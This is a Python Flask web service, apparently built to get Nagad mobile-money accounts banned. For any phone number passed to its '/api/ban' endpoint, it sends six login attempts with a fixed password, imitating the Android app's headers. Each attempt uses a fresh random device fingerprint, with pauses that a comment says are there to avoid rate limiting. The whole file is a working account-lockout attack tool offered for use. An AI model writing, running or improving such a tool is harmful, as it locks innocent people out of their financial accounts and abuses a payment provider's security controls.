from datetime import datetime
import hashlib
import os
import re
import time
import uuid
from flask import Flask, jsonify, request
import requests

app = Flask(__name__)

# ===================== CONFIG =====================
BASE_URL = os.environ.get("NAGAD_BASE_URL", "https://app2.mynagad.com:20002/api/login")
ASP_ID = os.environ.get("NAGAD_ASP_ID", "100012345612345")
PASSWORD = os.environ.get(
    "NAGAD_PASSWORD",
    "D885BCA1F73F287E925BDBF235C9452B34A76F4208A1FBE6BD40E659BE2C843B",
)


# ============ X-KM-DEVICE-FGP GENERATOR ============
def generate_fgp() -> str:
    seed = f"{os.urandom(16).hex()}-{uuid.uuid4()}-{time.time_ns()}"
    return hashlib.sha256(seed.encode("utf-8")).hexdigest().upper()


# ==================== LOGIN CALL ====================
def nagad_login(num: str, fgp: str, asp_id: str, password: str, base_url: str):
    payload = {
        "aspId": asp_id,
        "mpaId": None,
        "password": password,
        "username": num,
    }

    headers = {
        "Host": "app2.mynagad.com:20002",
        "User-Agent": "okhttp/5.0.0-alpha.7",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "X-KM-UserId": "99280234",
        "X-KM-User-AspId": asp_id,
        "X-KM-User-Agent": "ANDROID/1218",
        "X-KM-DEVICE-FGP": fgp,
        "X-KM-Accept-language": "bn",
        "X-KM-AppCode": "01",
        "Content-Type": "application/json; charset=UTF-8",
    }

    try:
        resp = requests.post(
            base_url,
            json=payload,
            headers=headers,
            timeout=30,
            verify=True,
        )
        status = resp.status_code
        try:
            body = resp.json()
        except ValueError:
            body = resp.text
        return status, body
    except requests.RequestException as exc:
        return 500, {"error": str(exc)}


# ==================== HANDLE REQUEST ====================
@app.route("/api/ban", methods=["GET"])
@app.route("/ban", methods=["GET"])
def handle_ban():
    raw_num = request.args.get("num", "")
    num = re.sub(r"\D", "", raw_num)  # শুধু ডিজিট রাখা

    if not num:
        return jsonify({"error": "num parameter missing. Use /api/ban?num=017XXXXXXXX"}), 400

    results = []

    # ৬ বার loop
    for i in range(1, 7):
        fgp = generate_fgp()
        status, body = nagad_login(num, fgp, ASP_ID, PASSWORD, BASE_URL)

        results.append({
            "attempt": i,
            "status_code": status,
            "device_fgp": fgp,
            "response": body,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        })

        if i < 6:
            time.sleep(1)  # rate-limit এড়াতে

    return jsonify({
        "num": num,
        "total_attempts": len(results),
        "results": results,
    }), 200


@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "status": "running",
        "usage": "/api/ban?num=017XXXXXXXX",
    }), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
